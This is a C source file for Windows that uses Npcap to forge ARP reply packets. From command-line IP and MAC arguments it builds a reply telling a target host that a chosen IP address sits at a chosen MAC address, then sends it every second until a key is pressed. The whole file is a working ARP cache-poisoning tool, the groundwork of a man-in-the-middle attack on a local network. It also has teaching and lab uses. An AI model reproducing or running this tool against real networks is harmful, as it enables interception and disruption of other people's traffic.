#define __USE_MINGW_ANSI_STDIO 1
#include <stdio.h>
#include <stdlib.h>
#include "protocol.h"
#include <conio.h>

#include <pcap.h> // use Npcap SDK

// converts a string in ip-address form to a numerical value
uint32_t TextToIP(char* arg)
{
    uint8_t ip[4];

    if (sscanf(arg, "%hhu.%hhu.%hhu.%hhu", &ip[0], &ip[1], &ip[2], &ip[3]) != 4)
    {
        fprintf(stderr, "\nError parsing IP %s\n", arg);
        return 0;
    }
    else
        return *((uint32_t*)&ip[0]);
}

// converts a string of 6 hex numbers to an array of numbers
int TextToMAC(char* arg, uint8_t mac[] )
{
    unsigned int _mac[6];

    if (sscanf(arg, "%x:%x:%x:%x:%x:%x", &_mac[0], &_mac[1], &_mac[2], &_mac[3],&_mac[4],&_mac[5]) != 6)
        return 0;

    for (int i = 0; i < 6; i++)
        mac[i] = (uint8_t)_mac[i];

    return 1;
}

char *iptos(u_long in)
{
    #define IPTOSBUFFERS	12
	static char output[IPTOSBUFFERS][3*4+3+1];
	static short which;
	u_char *p;

	p = (u_char *)&in;
	which = (which + 1 == IPTOSBUFFERS ? 0 : which + 1);
	sprintf(output[which], "%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
	return output[which];
}

int GetPcapDev(int desiredDeviceIndex, char out_deviceName[])
{
    int retcode = -1;
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_if_t* alldevsp;

    if (pcap_findalldevs(&alldevsp,errbuf))
    {
        fprintf(stderr, "\nCould not enumerated devices: %s", errbuf);
        return retcode;
    }

    int device_index = 0;
    pcap_if_t* currDev;
    for (currDev = alldevsp; currDev != NULL; currDev = currDev->next, device_index++)
    {
        if (desiredDeviceIndex < 0)
        {
            printf("\nDEVICE #%d:", device_index);
            printf("\n\tNAME: %s", currDev->name);
            printf("\n\tDESC: %s", currDev->description);
            printf("\n\tLOOP: %s", (currDev->flags & PCAP_IF_LOOPBACK) ? "Yes" : "No");

            int addrIndex = 0;
            pcap_addr_t* curAddr;
            for (curAddr = currDev->addresses; curAddr != NULL; curAddr = curAddr->next, addrIndex++)
            {
                if (curAddr->addr->sa_family != AF_INET)
                    continue;

                printf("\n\tADDR %d:", addrIndex);
                printf("\n\t\tIP: %s",          (curAddr->addr == NULL)         ? "NULL" : iptos(((struct sockaddr_in *)curAddr->addr)->sin_addr.s_addr));
                printf("\n\t\tNETMASK: %s",     (curAddr->netmask == NULL)      ? "NULL" : iptos(((struct sockaddr_in *)curAddr->netmask)->sin_addr.s_addr));
                printf("\n\t\tBROADCAST: %s",   (curAddr->broadaddr == NULL)    ? "NULL" : iptos(((struct sockaddr_in *)curAddr->broadaddr)->sin_addr.s_addr));
                printf("\n\t\tDESTINATION: %s", (curAddr->dstaddr == NULL)      ? "NULL" : iptos(((struct sockaddr_in *)curAddr->dstaddr)->sin_addr.s_addr));
            }
        }

        if (device_index == desiredDeviceIndex)
        {
            strcpy(out_deviceName, currDev->name);
            retcode = desiredDeviceIndex;
        }
    }

    pcap_freealldevs(alldevsp);
    return retcode;
}

#define arg_option argv[1]
#define arg_spa argv[2]
#define arg_sha argv[3]
#define arg_tpa argv[4]
#define arg_tha argv[5]

int main(int argc, char** argv)
{
    if (sizeof(struct arp_packet) != 28) // check if the compiler produced the required packing in the structure
    {
        fprintf(stderr, "\nCheck your compiler packing attributes! \"struct arp_packet\" has expected length of 28!");
        return -1;
    }

    int desiredDevice;
    char deviceName[256] = "";

    // user asking for a list of devices
    if (argc == 2)
    {
        if (strcmp(arg_option, "list") == 0)
        {
            GetPcapDev(-1, deviceName);
            return 0;
        }
    }
    else if (argc != 6)
    {
        SHOW_USAGE:
        printf("\n\nUsage: device-number sender-ip sender-mac target-ip target-mac");
        printf("\nUsage: list");
        return 0;
    }

    // read the selected device from cmd line
    if (sscanf(arg_option, "%d", &desiredDevice) != 1)
        goto SHOW_USAGE;

    if (GetPcapDev(desiredDevice, deviceName) != desiredDevice)
    {
        fprintf(stderr, "\nInvalid device or error!");
        return -1;
    }
    else
        printf("\nSelected device: %s", deviceName);


    // build the arp packet from the command line
    struct my_full_packet my_pkt;

    my_pkt.arp = (struct arp_packet) {
        .HTYPE = arp_htype_Ethernet,    // (uint16_t)
        .PTYPE = ptype_IpV4,            // (uint16_t) only ipv4 support so far...
        .HLEN = 6,                              // (uint8_t ) mac address is 48-bit long
        .PLEN = 4,                              // (uint8_t ) ip address is 32-bit long
        .OPER = arp_oper_Reply,         // (uint16_t) we are spoofing replies
    };

    if ((my_pkt.arp.SPA = TextToIP(arg_spa)) == 0)
        goto SHOW_USAGE;

    if (!TextToMAC(arg_sha, my_pkt.arp.SHA))
        goto SHOW_USAGE;

    if ((my_pkt.arp.TPA = TextToIP(arg_tpa)) == 0)
        goto SHOW_USAGE;

    if (!TextToMAC(arg_tha, my_pkt.arp.THA))
        goto SHOW_USAGE;

    // build the ethernet header
    my_pkt.ethernet = (struct ethernet_header) {
        //.mac_dst = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
        //.mac_src = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
        .protocol = ptype_Arp,
    };
    memcpy(&my_pkt.ethernet.mac_dst[0], &my_pkt.arp.THA[0], 6);
    memcpy(&my_pkt.ethernet.mac_src[0], &my_pkt.arp.SHA[0], 6);

    printf("\nTell target(ip:%s mac %02X:%02X:%02X:%02X:%02X:%02X) that address %s is at mac %02X:%02X:%02X:%02X:%02X:%02X\n",
           arg_tpa, my_pkt.arp.THA[0], my_pkt.arp.THA[1], my_pkt.arp.THA[2], my_pkt.arp.THA[3], my_pkt.arp.THA[4], my_pkt.arp.THA[5], arg_spa, my_pkt.arp.SHA[0], my_pkt.arp.SHA[1], my_pkt.arp.SHA[2], my_pkt.arp.SHA[3], my_pkt.arp.SHA[4], my_pkt.arp.SHA[5]);

    // prepare interface to send packets
    pcap_t* fp;
    char errbuf[PCAP_ERRBUF_SIZE];

    printf("\nWin P Cap version: %s\n\n", pcap_lib_version());
    if ((fp = pcap_open_live(deviceName, 65536, 1, 1000, errbuf)) == NULL)
	{
		fprintf(stderr,"\nWinPcap error opening the adapter: %s", errbuf);
		return -1;
	}

	printf("\n\nPACKET HEX:\n");
	for (int i = 0; i < sizeof(my_pkt); i++ )
    {
        printf("%.02x ", ((uint8_t*)&my_pkt)[i]);
        if ((i+1) % 6 == 0)
            printf("\n");
    }
    printf("\n");

    // loop sending packets
    int countSpoof = 0;
    while (!kbhit())
    {
        if (pcap_sendpacket(fp, (uint8_t*)&my_pkt, sizeof(my_pkt)) != 0)
        {
            fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(fp));
            break;
        }
        else
            printf("\n[%d] Spoof!", countSpoof++);

        Sleep(1000);
    }

    pcap_close(fp);
    return 0;
}
